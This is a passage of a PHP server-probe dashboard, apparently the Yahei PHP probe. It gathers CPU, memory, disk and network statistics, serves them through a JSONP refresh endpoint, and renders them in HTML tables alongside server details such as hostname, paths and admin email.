	$res['win_n'] = $sysinfo[0]['Caption'].&quot; &quot;.$sysinfo[0]['CSDVersion'].&quot; 序列号:&#123;$sysinfo[0]['SerialNumber']&#125; 于&quot;.date('Y年m月d日H:i:s',strtotime(substr($sysinfo[0]['InstallDate'],0,14))).&quot;安装&quot;;

	//UPTIME

	$res['uptime'] = $sysinfo[0]['LastBootUpTime'];


	$sys_ticks = 3600*8 + time() - strtotime(substr($res['uptime'],0,14));

	$min = $sys_ticks / 60;

	$hours = $min / 60;

	$days = floor($hours / 24);

	$hours = floor($hours - ($days * 24));

	$min = floor($min - ($days * 60 * 24) - ($hours * 60));

	if ($days !== 0) $res['uptime'] = $days.&quot;天&quot;;

	if ($hours !== 0) $res['uptime'] .= $hours.&quot;小时&quot;;

	$res['uptime'] .= $min.&quot;分钟&quot;;


	//MEMORY

	$res['memTotal'] = round($sysinfo[0]['TotalVisibleMemorySize']/1024,2);

	$res['memFree'] = round($sysinfo[0]['FreePhysicalMemory']/1024,2);

	$res['memUsed'] = $res['memTotal']-$res['memFree'];	//上面两行已经除以1024,这行不用再除了

	$res['memPercent'] = round($res['memUsed'] / $res['memTotal']*100,2);


	$swapinfo = GetWMI($wmi,&quot;Win32_PageFileUsage&quot;, array('AllocatedBaseSize','CurrentUsage'));


	// LoadPercentage

	$loadinfo = GetWMI($wmi,&quot;Win32_Processor&quot;, array(&quot;LoadPercentage&quot;));

	$res['loadAvg'] = $loadinfo[0]['LoadPercentage'];


	return $res;

&#125;



function GetWMI($wmi,$strClass, $strValue = array())
&#123;

	$arrData = array();


	$objWEBM = $wmi-&gt;Get($strClass);

	$arrProp = $objWEBM-&gt;Properties_;

	$arrWEBMCol = $objWEBM-&gt;Instances_();

	foreach($arrWEBMCol as $objItem) 
	&#123;

		@reset($arrProp);

		$arrInstance = array();

		foreach($arrProp as $propItem) 
		&#123;

			eval(&quot;\$value = \$objItem-&gt;&quot; . $propItem-&gt;Name . &quot;;&quot;);

			if (empty($strValue)) 
			&#123;

				$arrInstance[$propItem-&gt;Name] = trim($value);

			&#125; 
			else
			&#123;

				if (in_array($propItem-&gt;Name, $strValue)) 
				&#123;

					$arrInstance[$propItem-&gt;Name] = trim($value);

				&#125;

			&#125;

		&#125;

		$arrData[] = $arrInstance;

	&#125;

	return $arrData;

&#125;



//比例条

function bar($percent)
&#123;

?&gt;

	&lt;div class=&quot;bar&quot;&gt;&lt;div class=&quot;barli&quot; style=&quot;width:&lt;?php echo $percent?&gt;%&quot;&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;

&lt;?php

&#125;



$uptime = $sysInfo['uptime']; //在线时间

$stime = date('Y-m-d H:i:s'); //系统当前时间

//硬盘

$dt = round(@disk_total_space(&quot;.&quot;)/(1024*1024*1024),3); //总
$df = round(@disk_free_space(&quot;.&quot;)/(1024*1024*1024),3); //可用
$du = $dt-$df; //已用
$hdPercent = (floatval($dt)!=0)?round($du/$dt*100,2):0;

$load = $sysInfo['loadAvg'];	//系统负载


//判断内存如果小于1G，就显示M，否则显示G单位
if($sysInfo['memTotal']&lt;1024)
&#123;
	$memTotal = $sysInfo['memTotal'].&quot; M&quot;;
	$mt = $sysInfo['memTotal'].&quot; M&quot;;
	$mu = $sysInfo['memUsed'].&quot; M&quot;;
	$mf = $sysInfo['memFree'].&quot; M&quot;;
	$mc = $sysInfo['memCached'].&quot; M&quot;;	//cache化内存
	$mb = $sysInfo['memBuffers'].&quot; M&quot;;	//缓冲
	$st = $sysInfo['swapTotal'].&quot; M&quot;;
	$su = $sysInfo['swapUsed'].&quot; M&quot;;
	$sf = $sysInfo['swapFree'].&quot; M&quot;;
	$swapPercent = $sysInfo['swapPercent'];
	$memRealUsed = $sysInfo['memRealUsed'].&quot; M&quot;; //真实内存使用
	$memRealFree = $sysInfo['memRealFree'].&quot; M&quot;; //真实内存空闲
	$memRealPercent = $sysInfo['memRealPercent']; //真实内存使用比率
	$memPercent = $sysInfo['memPercent']; //内存总使用率
	$memCachedPercent = $sysInfo['memCachedPercent']; //cache内存使用率
&#125;
else
&#123;
	$memTotal = round($sysInfo['memTotal']/1024,3).&quot; G&quot;;
	$mt = round($sysInfo['memTotal']/1024,3).&quot; G&quot;;
	$mu = round($sysInfo['memUsed']/1024,3).&quot; G&quot;;
	$mf = round($sysInfo['memFree']/1024,3).&quot; G&quot;;
	$mc = round($sysInfo['memCached']/1024,3).&quot; G&quot;;
	$mb = round($sysInfo['memBuffers']/1024,3).&quot; G&quot;;
	$st = round($sysInfo['swapTotal']/1024,3).&quot; G&quot;;
	$su = round($sysInfo['swapUsed']/1024,3).&quot; G&quot;;
	$sf = round($sysInfo['swapFree']/1024,3).&quot; G&quot;;
	$swapPercent = $sysInfo['swapPercent'];
	$memRealUsed = round($sysInfo['memRealUsed']/1024,3).&quot; G&quot;; //真实内存使用
	$memRealFree = round($sysInfo['memRealFree']/1024,3).&quot; G&quot;; //真实内存空闲
	$memRealPercent = $sysInfo['memRealPercent']; //真实内存使用比率
	$memPercent = $sysInfo['memPercent']; //内存总使用率
	$memCachedPercent = $sysInfo['memCachedPercent']; //cache内存使用率
&#125;


//网卡流量

$strs = @file(&quot;/proc/net/dev&quot;); 



for ($i = 2; $i &lt; count($strs); $i++ )
&#123;
	preg_match_all( &quot;/([^\s]+):[\s]&#123;0,&#125;(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)/&quot;, $strs[$i], $info );
	$NetOutSpeed[$i] = $info[10][0];
	$NetInputSpeed[$i] = $info[2][0];
	$NetInput[$i] = formatsize($info[2][0]);
	$NetOut[$i]  = formatsize($info[10][0]);
&#125;


//ajax调用实时刷新

if ($_GET['act'] == &quot;rt&quot;)

&#123;

	$arr=array('useSpace'=&gt;&quot;$du&quot;,'freeSpace'=&gt;&quot;$df&quot;,'hdPercent'=&gt;&quot;$hdPercent&quot;,'barhdPercent'=&gt;&quot;$hdPercent%&quot;,'TotalMemory'=&gt;&quot;$mt&quot;,'UsedMemory'=&gt;&quot;$mu&quot;,'FreeMemory'=&gt;&quot;$mf&quot;,'CachedMemory'=&gt;&quot;$mc&quot;,'Buffers'=&gt;&quot;$mb&quot;,'TotalSwap'=&gt;&quot;$st&quot;,'swapUsed'=&gt;&quot;$su&quot;,'swapFree'=&gt;&quot;$sf&quot;,'loadAvg'=&gt;&quot;$load&quot;,'uptime'=&gt;&quot;$uptime&quot;,'freetime'=&gt;&quot;$freetime&quot;,'bjtime'=&gt;&quot;$bjtime&quot;,'stime'=&gt;&quot;$stime&quot;,'memRealPercent'=&gt;&quot;$memRealPercent&quot;,'memRealUsed'=&gt;&quot;$memRealUsed&quot;,'memRealFree'=&gt;&quot;$memRealFree&quot;,'memPercent'=&gt;&quot;$memPercent%&quot;,'memCachedPercent'=&gt;&quot;$memCachedPercent&quot;,'barmemCachedPercent'=&gt;&quot;$memCachedPercent%&quot;,'swapPercent'=&gt;&quot;$swapPercent&quot;,'barmemRealPercent'=&gt;&quot;$memRealPercent%&quot;,'barswapPercent'=&gt;&quot;$swapPercent%&quot;,'NetOut2'=&gt;&quot;$NetOut[2]&quot;,'NetOut3'=&gt;&quot;$NetOut[3]&quot;,'NetOut4'=&gt;&quot;$NetOut[4]&quot;,'NetOut5'=&gt;&quot;$NetOut[5]&quot;,'NetOut6'=&gt;&quot;$NetOut[6]&quot;,'NetOut7'=&gt;&quot;$NetOut[7]&quot;,'NetOut8'=&gt;&quot;$NetOut[8]&quot;,'NetOut9'=&gt;&quot;$NetOut[9]&quot;,'NetOut10'=&gt;&quot;$NetOut[10]&quot;,'NetInput2'=&gt;&quot;$NetInput[2]&quot;,'NetInput3'=&gt;&quot;$NetInput[3]&quot;,'NetInput4'=&gt;&quot;$NetInput[4]&quot;,'NetInput5'=&gt;&quot;$NetInput[5]&quot;,'NetInput6'=&gt;&quot;$NetInput[6]&quot;,'NetInput7'=&gt;&quot;$NetInput[7]&quot;,'NetInput8'=&gt;&quot;$NetInput[8]&quot;,'NetInput9'=&gt;&quot;$NetInput[9]&quot;,'NetInput10'=&gt;&quot;$NetInput[10]&quot;,'NetOutSpeed2'=&gt;&quot;$NetOutSpeed[2]&quot;,'NetOutSpeed3'=&gt;&quot;$NetOutSpeed[3]&quot;,'NetOutSpeed4'=&gt;&quot;$NetOutSpeed[4]&quot;,'NetOutSpeed5'=&gt;&quot;$NetOutSpeed[5]&quot;,'NetInputSpeed2'=&gt;&quot;$NetInputSpeed[2]&quot;,'NetInputSpeed3'=&gt;&quot;$NetInputSpeed[3]&quot;,'NetInputSpeed4'=&gt;&quot;$NetInputSpeed[4]&quot;,'NetInputSpeed5'=&gt;&quot;$NetInputSpeed[5]&quot;);

	$jarr=json_encode($arr); 
	$_GET['callback'] = htmlspecialchars($_GET['callback']);

	echo $_GET['callback'],'(',$jarr,')';

	exit;

&#125;

?&gt;

&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;

&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;

&lt;head&gt;
&lt;title&gt;&lt;?php echo $title.$version; ?&gt;&lt;/title&gt;
&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=EmulateIE7&quot; /&gt;

&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;!-- Powered by: Yahei.Net --&gt;

&lt;style type=&quot;text/css&quot;&gt;
&lt;!--
* &#123;font-family: &quot;Microsoft Yahei&quot;,Tahoma, Arial; &#125;
body&#123;text-align: center; margin: 0 auto; padding: 0; background-color:#fafafa;font-size:12px;font-family:Tahoma, Arial&#125;
h1 &#123;font-size: 26px; padding: 0; margin: 0; color: #333333; font-family: &quot;Lucida Sans Unicode&quot;,&quot;Lucida Grande&quot;,sans-serif;&#125;
h1 small &#123;font-size: 11px; font-family: Tahoma; font-weight: bold; &#125;
a&#123;color: #666; text-decoration:none;&#125;
a.black&#123;color: #000000; text-decoration:none;&#125;
table&#123;width:100%;clear:both;padding: 0; margin: 0 0 10px;border-collapse:collapse; border-spacing: 0;
box-shadow: 1px 1px 1px #CCC;
-moz-box-shadow: 1px 1px 1px #CCC;
-webkit-box-shadow: 1px 1px 1px #CCC;
-ms-filter: &quot;progid:DXImageTransform.Microsoft.Shadow(Strength=2, Direction=135, Color='#CCCCCC')&quot;;&#125;
th&#123;padding: 3px 6px; font-weight:bold;background:#dedede;color:#626262;border:1px solid #cccccc; text-align:left;&#125;
tr&#123;padding: 0; background:#FFFFFF;&#125;
td&#123;padding: 3px 6px; border:1px solid #CCCCCC;&#125;
.w_logo&#123;height:25px;text-align:center;color:#333;FONT-SIZE: 15px; width:13%; &#125;
.w_top&#123;height:25px;text-align:center; width:8.7%;&#125;
.w_top:hover&#123;background:#dadada;&#125;
.w_foot&#123;height:25px;text-align:center; background:#dedede;&#125;
input&#123;padding: 2px; background: #FFFFFF; border-top:1px solid #666666; border-left:1px solid #666666; border-right:1px solid #CCCCCC; border-bottom:1px solid #CCCCCC; font-size:12px&#125;
input.btn&#123;font-weight: bold; height: 20px; line-height: 20px; padding: 0 6px; color:#666666; background: #f2f2f2; border:1px solid #999;font-size:12px&#125;
.bar &#123;border:1px solid #999999; background:#FFFFFF; height:5px; font-size:2px; width:89%; margin:2px 0 5px 0;padding:1px; overflow: hidden;&#125;
.bar_1 &#123;border:1px dotted #999999; background:#FFFFFF; height:5px; font-size:2px; width:89%; margin:2px 0 5px 0;padding:1px; overflow: hidden;&#125;
.barli_red&#123;background:#ff6600; height:5px; margin:0px; padding:0;&#125;
.barli_blue&#123;background:#0099FF; height:5px; margin:0px; padding:0;&#125;
.barli_green&#123;background:#36b52a; height:5px; margin:0px; padding:0;&#125;
.barli_black&#123;background:#333; height:5px; margin:0px; padding:0;&#125;
.barli_1&#123;background:#999999; height:5px; margin:0px; padding:0;&#125;
.barli&#123;background:#36b52a; height:5px; margin:0px; padding:0;&#125;
#page &#123;width: 960px; padding: 0 auto; margin: 0 auto; text-align: left;&#125;
#header&#123;position:relative; padding:5px;&#125;
.w_small&#123;font-family: Courier New;&#125;
.w_number&#123;color: #f800fe;&#125;
.sudu &#123;padding: 0; background:#5dafd1; &#125;
.suduk &#123; margin:0px; padding:0;&#125;
.resYes&#123;&#125;
.resNo&#123;color: #FF0000;&#125;
.word&#123;word-break:break-all;&#125;
--&gt;
&lt;/style&gt;

&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot; src=&quot;http://lib.sinaapp.com/js/jquery/1.7/jquery.min.js&quot;&gt;&lt;/script&gt;

&lt;script type=&quot;text/javascript&quot;&gt; 

&lt;!--

$(document).ready(function()&#123;getJSONData();&#125;);
var OutSpeed2=&lt;?php echo floor($NetOutSpeed[2]) ?&gt;;
var OutSpeed3=&lt;?php echo floor($NetOutSpeed[3]) ?&gt;;
var OutSpeed4=&lt;?php echo floor($NetOutSpeed[4]) ?&gt;;
var OutSpeed5=&lt;?php echo floor($NetOutSpeed[5]) ?&gt;;
var InputSpeed2=&lt;?php echo floor($NetInputSpeed[2]) ?&gt;;
var InputSpeed3=&lt;?php echo floor($NetInputSpeed[3]) ?&gt;;
var InputSpeed4=&lt;?php echo floor($NetInputSpeed[4]) ?&gt;;
var InputSpeed5=&lt;?php echo floor($NetInputSpeed[5]) ?&gt;;

function getJSONData()

&#123;

	setTimeout(&quot;getJSONData()&quot;, 1000);

	$.getJSON('?act=rt&amp;callback=?', displayData);

&#125;
function ForDight(Dight,How)
&#123; 
  if (Dight&lt;0)&#123;
  	var Last=0+&quot;B/s&quot;;
  &#125;else if (Dight&lt;1024)&#123;
  	var Last=Math.round(Dight*Math.pow(10,How))/Math.pow(10,How)+&quot;B/s&quot;;
  &#125;else if (Dight&lt;1048576)&#123;
  	Dight=Dight/1024;
  	var Last=Math.round(Dight*Math.pow(10,How))/Math.pow(10,How)+&quot;K/s&quot;;
  &#125;else&#123;
  	Dight=Dight/1048576;
  	var Last=Math.round(Dight*Math.pow(10,How))/Math.pow(10,How)+&quot;M/s&quot;;
  &#125;
	return Last; 
&#125;

function displayData(dataJSON)

&#123;
	$(&quot;#useSpace&quot;).html(dataJSON.useSpace);

	$(&quot;#freeSpace&quot;).html(dataJSON.freeSpace);
	$(&quot;#hdPercent&quot;).html(dataJSON.hdPercent);
	$(&quot;#barhdPercent&quot;).width(dataJSON.barhdPercent);

	$(&quot;#TotalMemory&quot;).html(dataJSON.TotalMemory);

	$(&quot;#UsedMemory&quot;).html(dataJSON.UsedMemory);

	$(&quot;#FreeMemory&quot;).html(dataJSON.FreeMemory);

	$(&quot;#CachedMemory&quot;).html(dataJSON.CachedMemory);
	$(&quot;#Buffers&quot;).html(dataJSON.Buffers);

	$(&quot;#TotalSwap&quot;).html(dataJSON.TotalSwap);

	$(&quot;#swapUsed&quot;).html(dataJSON.swapUsed);

	$(&quot;#swapFree&quot;).html(dataJSON.swapFree);

	$(&quot;#swapPercent&quot;).html(dataJSON.swapPercent);

	$(&quot;#loadAvg&quot;).html(dataJSON.loadAvg);

	$(&quot;#uptime&quot;).html(dataJSON.uptime);

	$(&quot;#freetime&quot;).html(dataJSON.freetime);

	$(&quot;#stime&quot;).html(dataJSON.stime);

	$(&quot;#bjtime&quot;).html(dataJSON.bjtime);

	$(&quot;#memRealUsed&quot;).html(dataJSON.memRealUsed);
	$(&quot;#memRealFree&quot;).html(dataJSON.memRealFree);
	$(&quot;#memRealPercent&quot;).html(dataJSON.memRealPercent);

	$(&quot;#memPercent&quot;).html(dataJSON.memPercent);
	$(&quot;#barmemPercent&quot;).width(dataJSON.memPercent);

	$(&quot;#barmemRealPercent&quot;).width(dataJSON.barmemRealPercent);
	$(&quot;#memCachedPercent&quot;).html(dataJSON.memCachedPercent);
	$(&quot;#barmemCachedPercent&quot;).width(dataJSON.barmemCachedPercent);

	$(&quot;#barswapPercent&quot;).width(dataJSON.barswapPercent);

	$(&quot;#NetOut2&quot;).html(dataJSON.NetOut2);

	$(&quot;#NetOut3&quot;).html(dataJSON.NetOut3);

	$(&quot;#NetOut4&quot;).html(dataJSON.NetOut4);

	$(&quot;#NetOut5&quot;).html(dataJSON.NetOut5);

	$(&quot;#NetOut6&quot;).html(dataJSON.NetOut6);

	$(&quot;#NetOut7&quot;).html(dataJSON.NetOut7);

	$(&quot;#NetOut8&quot;).html(dataJSON.NetOut8);

	$(&quot;#NetOut9&quot;).html(dataJSON.NetOut9);

	$(&quot;#NetOut10&quot;).html(dataJSON.NetOut10);
	$(&quot;#NetInput2&quot;).html(dataJSON.NetInput2);
	$(&quot;#NetInput3&quot;).html(dataJSON.NetInput3);
	$(&quot;#NetInput4&quot;).html(dataJSON.NetInput4);
	$(&quot;#NetInput5&quot;).html(dataJSON.NetInput5);
	$(&quot;#NetInput6&quot;).html(dataJSON.NetInput6);
	$(&quot;#NetInput7&quot;).html(dataJSON.NetInput7);
	$(&quot;#NetInput8&quot;).html(dataJSON.NetInput8);
	$(&quot;#NetInput9&quot;).html(dataJSON.NetInput9);
	$(&quot;#NetInput10&quot;).html(dataJSON.NetInput10);	
	$(&quot;#NetOutSpeed2&quot;).html(ForDight((dataJSON.NetOutSpeed2-OutSpeed2),3));	OutSpeed2=dataJSON.NetOutSpeed2;
	$(&quot;#NetOutSpeed3&quot;).html(ForDight((dataJSON.NetOutSpeed3-OutSpeed3),3));	OutSpeed3=dataJSON.NetOutSpeed3;
	$(&quot;#NetOutSpeed4&quot;).html(ForDight((dataJSON.NetOutSpeed4-OutSpeed4),3));	OutSpeed4=dataJSON.NetOutSpeed4;
	$(&quot;#NetOutSpeed5&quot;).html(ForDight((dataJSON.NetOutSpeed5-OutSpeed5),3));	OutSpeed5=dataJSON.NetOutSpeed5;
	$(&quot;#NetInputSpeed2&quot;).html(ForDight((dataJSON.NetInputSpeed2-InputSpeed2),3));	InputSpeed2=dataJSON.NetInputSpeed2;
	$(&quot;#NetInputSpeed3&quot;).html(ForDight((dataJSON.NetInputSpeed3-InputSpeed3),3));	InputSpeed3=dataJSON.NetInputSpeed3;
	$(&quot;#NetInputSpeed4&quot;).html(ForDight((dataJSON.NetInputSpeed4-InputSpeed4),3));	InputSpeed4=dataJSON.NetInputSpeed4;
	$(&quot;#NetInputSpeed5&quot;).html(ForDight((dataJSON.NetInputSpeed5-InputSpeed5),3));	InputSpeed5=dataJSON.NetInputSpeed5;

&#125;

--&gt;

&lt;/script&gt;

&lt;/head&gt;

&lt;body&gt;
&lt;a name=&quot;w_top&quot;&gt;&lt;/a&gt;

&lt;div id=&quot;page&quot;&gt;

	
	&lt;table&gt;
		&lt;tr&gt;
			&lt;th class=&quot;w_logo&quot;&gt;雅黑PHP探针&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_php&quot;&gt;PHP参数&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_module&quot;&gt;组件支持&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_module_other&quot;&gt;第三方组件&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_db&quot;&gt;数据库支持&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_performance&quot;&gt;性能检测&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_networkspeed&quot;&gt;网速检测&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_MySQL&quot;&gt;MySQL检测&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_function&quot;&gt;函数检测&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_mail&quot;&gt;邮件检测&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;http://www.yahei.net/tz/tz.zip&quot;&gt;探针下载&lt;/a&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/table&gt;



&lt;!--服务器相关参数--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;4&quot;&gt;服务器参数&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;服务器域名/IP地址&lt;/td&gt;

    &lt;td colspan=&quot;3&quot;&gt;&lt;?php echo @get_current_user();?&gt; - &lt;?php echo $_SERVER['SERVER_NAME'];?&gt;(&lt;?php if('/'==DIRECTORY_SEPARATOR)&#123;echo $_SERVER['SERVER_ADDR'];&#125;else&#123;echo @gethostbyname($_SERVER['SERVER_NAME']);&#125; ?&gt;)&amp;nbsp;&amp;nbsp;你的IP地址是：&lt;?php echo @$_SERVER['REMOTE_ADDR'];?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;服务器标识&lt;/td&gt;

    &lt;td colspan=&quot;3&quot;&gt;&lt;?php if($sysInfo['win_n'] != '')&#123;echo $sysInfo['win_n'];&#125;else&#123;echo @php_uname();&#125;;?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;13%&quot;&gt;服务器操作系统&lt;/td&gt;

    &lt;td width=&quot;37%&quot;&gt;&lt;?php $os = explode(&quot; &quot;, php_uname()); echo $os[0];?&gt; &amp;nbsp;内核版本：&lt;?php if('/'==DIRECTORY_SEPARATOR)&#123;echo $os[2];&#125;else&#123;echo $os[1];&#125; ?&gt;&lt;/td&gt;

    &lt;td width=&quot;13%&quot;&gt;服务器解译引擎&lt;/td&gt;

    &lt;td width=&quot;37%&quot;&gt;&lt;?php echo $_SERVER['SERVER_SOFTWARE'];?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;服务器语言&lt;/td&gt;

    &lt;td&gt;&lt;?php echo getenv(&quot;HTTP_ACCEPT_LANGUAGE&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;服务器端口&lt;/td&gt;

    &lt;td&gt;&lt;?php echo $_SERVER['SERVER_PORT'];?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

	  &lt;td&gt;服务器主机名&lt;/td&gt;

	  &lt;td&gt;&lt;?php if('/'==DIRECTORY_SEPARATOR )&#123;echo $os[1];&#125;else&#123;echo $os[2];&#125; ?&gt;&lt;/td&gt;

	  &lt;td&gt;绝对路径&lt;/td&gt;

	  &lt;td&gt;&lt;?php echo $_SERVER['DOCUMENT_ROOT']?str_replace('\\','/',$_SERVER['DOCUMENT_ROOT']):str_replace('\\','/',dirname(__FILE__));?&gt;&lt;/td&gt;

	&lt;/tr&gt;

  &lt;tr&gt;

	  &lt;td&gt;管理员邮箱&lt;/td&gt;

	  &lt;td&gt;&lt;?php echo $_SERVER['SERVER_ADMIN'];?&gt;&lt;/td&gt;

		&lt;td&gt;探针路径&lt;/td&gt;

		&lt;td&gt;&lt;?php echo str_replace('\\','/',__FILE__)?str_replace('\\','/',__FILE__):$_SERVER['SCRIPT_FILENAME'];?&gt;&lt;/td&gt;

	&lt;/tr&gt;	

&lt;/table&gt;



&lt;?if(&quot;show&quot;==$sysReShow)&#123;?&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;6&quot;&gt;服务器实时数据&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;13%&quot; &gt;服务器当前时间&lt;/td&gt;

    &lt;td width=&quot;37%&quot; &gt;&lt;span id=&quot;stime&quot;&gt;&lt;?php echo $stime;?&gt;&lt;/span&gt;&lt;/td&gt;

    &lt;td width=&quot;13%&quot; &gt;服务器已运行时间&lt;/td&gt;

    &lt;td width=&quot;37%&quot; colspan=&quot;3&quot;&gt;&lt;span id=&quot;uptime&quot;&gt;&lt;?php echo $uptime;?&gt;&lt;/span&gt;&lt;/td&gt;

  &lt;/tr&gt;
  &lt;tr&gt;

    &lt;td width=&quot;13%&quot;&gt;CPU型号 [&lt;?php echo $sysInfo['cpu']['num'];?&gt;核]&lt;/td&gt;

    &lt;td width=&quot;87%&quot; colspan=&quot;5&quot;&gt;&lt;?php echo $sysInfo['cpu']['model'];?&gt;&lt;/td&gt;

  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;CPU使用状况&lt;/td&gt;
    &lt;td colspan=&quot;5&quot;&gt;&lt;?php if('/'==DIRECTORY_SEPARATOR)&#123;echo $cpu_show.&quot; | &lt;a href='&quot;.$phpSelf.&quot;?act=cpu_percentage' target='_blank' class='static'&gt;查看图表&lt;/a&gt;&quot;;&#125;else&#123;echo &quot;暂时只支持Linux系统&quot;;&#125;?&gt;
	&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;硬盘使用状况&lt;/td&gt;
    &lt;td colspan=&quot;5&quot;&gt;
		总空间 &lt;?php echo $dt;?&gt;&amp;nbsp;G，
		已用 &lt;font color='#333333'&gt;&lt;span id=&quot;useSpace&quot;&gt;&lt;?php echo $du;?&gt;&lt;/span&gt;&lt;/font&gt;&amp;nbsp;G，
		空闲 &lt;font color='#333333'&gt;&lt;span id=&quot;freeSpace&quot;&gt;&lt;?php echo $df;?&gt;&lt;/span&gt;&lt;/font&gt;&amp;nbsp;G，
		使用率 &lt;span id=&quot;hdPercent&quot;&gt;&lt;?php echo $hdPercent;?&gt;&lt;/span&gt;%
		&lt;div class=&quot;bar&quot;&gt;&lt;div id=&quot;barhdPercent&quot; class=&quot;barli_black&quot; style=&quot;width:&lt;?php echo $hdPercent;?&gt;%&quot; &gt;&amp;nbsp;&lt;/div&gt; &lt;/div&gt;
	&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;

		&lt;td&gt;内存使用状况&lt;/td&gt;

		&lt;td colspan=&quot;5&quot;&gt;

&lt;?php

$tmp = array(

    'memTotal', 'memUsed', 'memFree', 'memPercent',

    'memCached', 'memRealPercent',

    'swapTotal', 'swapUsed', 'swapFree', 'swapPercent'

);

foreach ($tmp AS $v) &#123;

    $sysInfo[$v] = $sysInfo[$v] ? $sysInfo[$v] : 0;

&#125;

?&gt;

          物理内存：共

          &lt;font color='#CC0000'&gt;&lt;?php echo $memTotal;?&gt; &lt;/font&gt;

           , 已用

          &lt;font color='#CC0000'&gt;&lt;span id=&quot;UsedMemory&quot;&gt;&lt;?php echo $mu;?&gt;&lt;/span&gt;&lt;/font&gt;

          , 空闲

          &lt;font color='#CC0000'&gt;&lt;span id=&quot;FreeMemory&quot;&gt;&lt;?php echo $mf;?&gt;&lt;/span&gt;&lt;/font&gt;

          , 使用率

		  &lt;span id=&quot;memPercent&quot;&gt;&lt;?php echo $memPercent;?&gt;&lt;/span&gt;

          &lt;div class=&quot;bar&quot;&gt;&lt;div id=&quot;barmemPercent&quot; class=&quot;barli_green&quot; style=&quot;width:&lt;?php echo $memPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;/div&gt; &lt;/div&gt;
&lt;?php
//判断如果cache为0，不显示
if($sysInfo['memCached']&gt;0)
&#123;
?&gt;		
		  Cache化内存为 &lt;span id=&quot;CachedMemory&quot;&gt;&lt;?php echo $mc;?&gt;&lt;/span&gt;
		  , 使用率 
          &lt;span id=&quot;memCachedPercent&quot;&gt;&lt;?php echo $memCachedPercent;?&gt;&lt;/span&gt;
		  %	| Buffers缓冲为  &lt;span id=&quot;Buffers&quot;&gt;&lt;?php echo $mb;?&gt;&lt;/span&gt;
          &lt;div class=&quot;bar&quot;&gt;&lt;div id=&quot;barmemCachedPercent&quot; class=&quot;barli_blue&quot; style=&quot;width:&lt;?php echo $memCachedPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;

          真实内存使用
          &lt;span id=&quot;memRealUsed&quot;&gt;&lt;?php echo $memRealUsed;?&gt;&lt;/span&gt;
		  , 真实内存空闲
          &lt;span id=&quot;memRealFree&quot;&gt;&lt;?php echo $memRealFree;?&gt;&lt;/span&gt;
		  , 使用率
          &lt;span id=&quot;memRealPercent&quot;&gt;&lt;?php echo $memRealPercent;?&gt;&lt;/span&gt;
          %
          &lt;div class=&quot;bar_1&quot;&gt;&lt;div id=&quot;barmemRealPercent&quot; class=&quot;barli_1&quot; style=&quot;width:&lt;?php echo $memRealPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt; 
&lt;?php
&#125;
//判断如果SWAP区为0，不显示
if($sysInfo['swapTotal']&gt;0)
&#123;
?&gt;	
          SWAP区：共
          &lt;?php echo $st;?&gt;
          , 已使用
          &lt;span id=&quot;swapUsed&quot;&gt;&lt;?php echo $su;?&gt;&lt;/span&gt;
          , 空闲
          &lt;span id=&quot;swapFree&quot;&gt;&lt;?php echo $sf;?&gt;&lt;/span&gt;
          , 使用率
          &lt;span id=&quot;swapPercent&quot;&gt;&lt;?php echo $swapPercent;?&gt;&lt;/span&gt;
          %
          &lt;div class=&quot;bar&quot;&gt;&lt;div id=&quot;barswapPercent&quot; class=&quot;barli_red&quot; style=&quot;width:&lt;?php echo $swapPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;/div&gt; &lt;/div&gt;

&lt;?php
&#125;	
?&gt;		  

	  &lt;/td&gt;

	&lt;/tr&gt;
	  &lt;tr&gt;
		&lt;td&gt;系统平均负载&lt;/td&gt;
